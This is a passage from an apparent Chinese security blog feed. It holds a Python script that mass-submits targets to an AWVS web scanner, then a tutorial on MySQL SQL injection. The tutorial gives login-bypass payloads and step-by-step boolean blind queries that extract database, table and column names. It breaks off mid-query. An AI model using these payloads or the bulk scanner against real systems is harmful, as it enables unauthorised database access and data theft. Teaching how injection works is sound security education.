        <content type="html"><![CDATA[<hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AwvsScan</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.scanner = <span class="string">'https://127.0.0.1/'</span></span><br><span class="line">        self.key = <span class="string">'1986ad8c0a5b3df4d7028d5f3c06e286c1003632f31f2423599bfb945100ce3de'</span></span><br><span class="line">        self.ScanMode = <span class="string">'11111111-1111-1111-1111-111111111111'</span></span><br><span class="line">        self.headers = &#123;<span class="string">'X-Auth'</span>: self.key, <span class="string">'content-type'</span>: <span class="string">'application/json'</span>&#125;</span><br><span class="line">        self.targets_id = queue.Queue()</span><br><span class="line">        self.scan_id = queue.Queue()</span><br><span class="line">        self.site = queue.Queue()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'='</span>*<span class="number">80</span>)</span><br><span class="line">        print(<span class="string">"""1、使用awvs.txt添加扫描任务\n2、删除所有任务"""</span>)</span><br><span class="line">        print(<span class="string">'='</span>*<span class="number">80</span>)</span><br><span class="line">        choice = input(<span class="string">"&gt;"</span>)</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">'1'</span>:</span><br><span class="line">            self.scans()</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">'2'</span>:</span><br><span class="line">            self.del_targets()</span><br><span class="line">        self.main()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">openfile</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'awvs.txt'</span>) <span class="keyword">as</span> cent:</span><br><span class="line">            <span class="keyword">for</span> web_site <span class="keyword">in</span> cent:</span><br><span class="line">                web_site = web_site.strip(<span class="string">'\n\r'</span>)</span><br><span class="line">                self.site.put(web_site)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">targets</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.openfile()</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.site.empty():</span><br><span class="line">            website = self.site.get()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = &#123;<span class="string">'address'</span>:website,</span><br><span class="line">                        <span class="string">'description'</span>:<span class="string">'awvs-auto'</span>,</span><br><span class="line">                        <span class="string">'criticality'</span>:<span class="string">'10'</span>&#125;</span><br><span class="line">                response = requests.post(self.scanner + <span class="string">'/api/v1/targets'</span>, data=json.dumps(data), headers=self.headers, verify=<span class="literal">False</span>)</span><br><span class="line">                cent = json.loads(response.content)</span><br><span class="line">                target_id = cent[<span class="string">'target_id'</span>]</span><br><span class="line">                self.targets_id.put(target_id)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(<span class="string">'Target is not website! &#123;&#125;'</span>.format(website))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">scans</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.targets()</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.targets_id.empty():</span><br><span class="line">            data = &#123;<span class="string">'target_id'</span> : self.targets_id.get(),</span><br><span class="line">                    <span class="string">'profile_id'</span> : self.ScanMode,</span><br><span class="line">                    <span class="string">'schedule'</span> : &#123;<span class="string">'disable'</span>: <span class="literal">False</span>, <span class="string">'start_date'</span>: <span class="literal">None</span>, <span class="string">'time_sensitive'</span> : <span class="literal">False</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">            response = requests.post(self.scanner + <span class="string">'/api/v1/scans'</span>, data=json.dumps(data), headers=self.headers, allow_redirects=<span class="literal">False</span>, verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">201</span>:</span><br><span class="line">                cent = response.headers[<span class="string">'Location'</span>].replace(<span class="string">'/api/v1/scans/'</span>,<span class="string">''</span>)</span><br><span class="line">                print(cent)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_targets_id</span><span class="params">(self)</span>:</span></span><br><span class="line">        response = requests.get(self.scanner + <span class="string">"/api/v1/targets"</span>, headers=self.headers, verify=<span class="literal">False</span>)</span><br><span class="line">        content = json.loads(response.content)</span><br><span class="line">        <span class="keyword">for</span> cent <span class="keyword">in</span> content[<span class="string">'targets'</span>]:</span><br><span class="line">            self.targets_id.put([cent[<span class="string">'address'</span>],cent[<span class="string">'target_id'</span>]])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">del_targets</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.get_targets_id()</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.targets_id.empty():</span><br><span class="line">            targets_info = self.targets_id.get()</span><br><span class="line">            response = requests.delete(self.scanner + <span class="string">"/api/v1/targets/"</span> + targets_info[<span class="number">1</span>], headers=self.headers, verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">204</span>:</span><br><span class="line">                print(<span class="string">'delete targets &#123;&#125;'</span>.format(targets_info[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    Scan = AwvsScan()</span><br><span class="line">    Scan.main()</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> 原创工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-SQL注入</title>
      <link href="/article/pentest-sql-injection.html"/>
      <url>/article/pentest-sql-injection.html</url>
      
        <content type="html"><![CDATA[<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>通俗易懂：<br>提交的SQL语句没有做处理，就直接带入数据库进行查询，就造成了SQL注入。</p><p>存在与数据库交互的地方就有可能存在注入。</p><p>值得注意的是：不管如何处理，最终的SQL执行语句一定是数据库可以执行查询的。</p><h3 id="SQL注入基础知识"><a href="#SQL注入基础知识" class="headerlink" title="SQL注入基础知识"></a>SQL注入基础知识</h3><p>SQL注入分只为两大类，int型和字符型，init型不需要单引号闭合，字符型需要单引号闭合。</p><p>涉及到的MySQL函数：</p><table><thead><tr><th align="left">函数名</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">system_user()</td><td align="left">系统用户名</td></tr><tr><td align="left">user()</td><td align="left">用户名</td></tr><tr><td align="left">current_user()</td><td align="left">当前用户名</td></tr><tr><td align="left">session_user()</td><td align="left">连接数据库的用户名</td></tr><tr><td align="left">database()</td><td align="left">数据库名</td></tr><tr><td align="left">version()</td><td align="left">MYSQL数据库版本</td></tr><tr><td align="left">load_file()</td><td align="left">MYSQL读取本地文件的函数</td></tr><tr><td align="left">mid(str,1,1)</td><td align="left">字符串截取(从第一个获取只获取一个)</td></tr><tr><td align="left">ord()</td><td align="left">转换成ascii码</td></tr><tr><td align="left">length()</td><td align="left">统计字节长度</td></tr><tr><td align="left">@@datadir</td><td align="left">读取数据库路径</td></tr><tr><td align="left">@@basedir</td><td align="left">MYSQL安装路径</td></tr><tr><td align="left">@@version_compile_os</td><td align="left">操作系统</td></tr></tbody></table><p>information_schema是MySQL自带的一个信息数据库，其保存着关于MySQL服务器所维护的所有其他数据库的信息，如数据库名，数据库的表，表栏的数据类型与访问权限等。<br>也就是说当你建立一个新的数据库，或者在已有的数据库中增删改表的话，都会记录在information_schema库中。如果我们要获取数据库中某个表有哪些字段，并将它们用逗号隔开顺序输出，我们就可以通过information_schema库来查询出来。</p><p>MySQL注释符：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 内容</span></span><br><span class="line"><span class="comment">#内容 (需要转义，否则浏览器会把这个符号当做锚点)</span></span><br><span class="line"><span class="comment">/*内容*/</span></span><br></pre></td></tr></table></figure><h3 id="布尔注入-返回真假"><a href="#布尔注入-返回真假" class="headerlink" title="布尔注入\返回真假"></a>布尔注入\返回真假</h3><p>通常的查询语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'test1'</span> <span class="keyword">and</span> passwd = <span class="string">'12345678'</span>;</span><br></pre></td></tr></table></figure><p>这里可以理解为，提交的用户名：test1 密码：12345678</p><p><img src="../do/images/pentest/pentest-sql-injection01.png" alt></p><p>如果不知道账号密码，如何能成功的查到数据库里边的数据？<br>试试提交构造的用户名：1’ or 2&gt;1 – 密码：123456,那么查询的SQL语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'1'</span> <span class="keyword">or</span> <span class="number">2</span>&gt;<span class="number">1</span> <span class="comment">-- ' and passwd = '密码：123456';</span></span><br></pre></td></tr></table></figure><p>成功查询的结果如下：<br><img src="../do/images/pentest/pentest-sql-injection02.png" alt></p><p>这里为什么还要输入一个；才能成功执行呢，因为–是MySQL的注释符号（–两边有空格），注释符后边的语句不会执行。</p><p>这括号里边的SQL语句不会执行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'1'</span> <span class="keyword">or</span> <span class="number">2</span>&gt;<span class="number">1</span> <span class="comment">-- （' and passwd = '密码：123456';）</span></span><br></pre></td></tr></table></figure><p>可以对构造的用户名改良一下：</p><p>用户名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1' or 2&gt;1; -- </span><br><span class="line">' or 2&gt;1; -- </span><br><span class="line">' or '2&gt;1'; -- </span><br><span class="line">' or '2!=1'; <span class="comment">-- </span></span><br><span class="line">' or True; <span class="comment">-- </span></span><br><span class="line">' or !False; <span class="comment">--</span></span><br></pre></td></tr></table></figure><p>那么在查询的时候SQL语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">''</span> <span class="keyword">or</span> <span class="number">2</span>&gt;<span class="number">1</span>; <span class="comment">-- ' and passwd = '密码：123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection03.png" alt></p><p>可以看到这里造成的SQL注入原因是带入查询的单引号，这里带入的单引号把SQL语句闭合了，并直接把后边的语句进行注释。</p><p>可以再来看看正常的SQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'test1'</span> <span class="keyword">and</span> passwd = <span class="string">'12345678'</span>;</span><br></pre></td></tr></table></figure><p>带入单引号闭合之后：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'test1'</span> <span class="keyword">or</span> <span class="literal">True</span>; <span class="comment">-- ' and passwd = '12345678';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection04.png" alt></p><p>不使用注释符还可以用单引号闭合：</p><p>用户名就是：’ or True and ‘1’ = ‘1</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'test1'</span> <span class="keyword">or</span> <span class="literal">True</span> <span class="keyword">and</span> <span class="string">'1'</span> = <span class="string">'1'</span> <span class="keyword">and</span> passwd = <span class="string">'12345678'</span>;</span><br></pre></td></tr></table></figure><p>上边可以说是后台绕过，那么如何进行注入呢？<br>1、获取当前数据库长度<br>2、获取当前数据库<br>3、获取当前数据库表的总数<br>4、获取当前数据库表的长度<br>5、获取当前数据库表的内容<br>6、获取当前数据库表的字段的总数<br>7、获取当前数据库表的字段的长度<br>8、获取当前数据库表的字段的内容<br>9、获取当前数据库表的字段的内容的长度<br>10、获取当前数据库表的字段的内容的内容</p><p>1、获取当前数据库长度<br>使用MySQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">length()</span><br><span class="line">database()</span><br></pre></td></tr></table></figure><p>逐步判断数据库的长度，这里判断数据库的长度大于5、大于4不成立，大于3成立，所以数据库的长度等于4：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">length</span>(<span class="keyword">database</span>()) &gt; <span class="number">5</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">length</span>(<span class="keyword">database</span>()) &gt; <span class="number">4</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">length</span>(<span class="keyword">database</span>()) &gt; <span class="number">3</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">length</span>(<span class="keyword">database</span>()) = <span class="number">4</span>; <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection18.png" alt></p><p>2、获取当前数据库<br>使用MySQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ord()</span><br></pre></td></tr></table></figure><p>一个一个的判断数据库的名字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,passwd from admin where username = &apos;123456&apos;or mid(database(),1,1) = 1; #&apos; and passwd = &apos;123456&apos;;</span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection19.png" alt></p><p>但这样太麻烦了，数据库可能是任何字符，而且想要猜出数据库的对应的字母太难了，所以可以用ord()转换成ASCII码。</p><p>获取数据库第一个字符，对应ASCII码表的t：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">100</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">150</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">110</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">115</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="number">118</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">116</span>; <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection20.png" alt></p><p>获取数据库第二个字符，对应ASCII码表的e：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'or ord(mid(database(),2,1)) = 101; <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>获取数据库第三个字符，对应ASCII码表的s：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'or ord(mid(database(),3,1)) = 115; <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>获取数据库第四个字符，对应ASCII码表的t：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'or ord(mid(database(),3,1)) = 116; <span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection21.png" alt><br>所以数据库是test。</p><p>3、获取当前数据库表的总数<br>使用MySQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">count()</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() ) &gt; <span class="number">2</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() ) = <span class="number">2</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() ) = <span class="number">1</span>; <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection22.png" alt></p><p>这里获取表的总数为1。</p><p>4、获取当前数据库表的长度<br>使用MySQL语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length()</span><br></pre></td></tr></table></figure><p>这里是获取第一个表，意思是从第0个开始取，取一个。获取第二个就是limit,1,1</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> (<span class="keyword">select</span> <span class="keyword">length</span>(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span> ) &gt; <span class="number">5</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> (<span class="keyword">select</span> <span class="keyword">length</span>(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span> ) &gt; <span class="number">4</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> (<span class="keyword">select</span> <span class="keyword">length</span>(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span> ) = <span class="number">5</span>; <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p>获取的第一个表长度为5。<br><img src="../do/images/pentest/pentest-sql-injection23.png" alt></p><p>5、获取当前数据库表的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">mid</span>((<span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>) = <span class="string">'1'</span>; <span class="comment">#' and passwd = '123456';</span></span><br><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">mid</span>((<span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>) = <span class="string">'a'</span>; <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection24.png" alt></p><p>当然还是要换成ASCII码：<br>获取表第一个字符，对应ASCII码表的a：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) &gt; <span class="string">'100'</span>; <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection25.png" alt></p><p>获取表第二个字符，对应ASCII码表的d：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> <span class="keyword">ord</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> TABLE_NAME <span class="keyword">from</span> information_schema.TABLES <span class="keyword">where</span> TABLE_SCHEMA=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>)) = <span class="string">'100'</span>; <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection26.png" alt><br>以此类推，就可以获取整个表名admin。</p><p>6、获取当前数据库表的字段的总数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span> ) = <span class="number">3</span>; <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection27.png" alt></p><p>获取表的字段总数为3。</p><p>7、获取当前数据库表的字段的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> (<span class="keyword">select</span> <span class="keyword">length</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>) = <span class="number">2</span>; <span class="comment">#' and passwd = '123456';</span></span><br></pre></td></tr></table></figure><p><img src="../do/images/pentest/pentest-sql-injection28.png" alt></p><p>获取到表的第一个的字段长度为2.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,passwd <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">'123456'</span><span class="keyword">or</span> (<span class="keyword">select</span> <span class="keyword">length</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>) = <span class="number">2</span>; <span class="comment">#' and passwd = 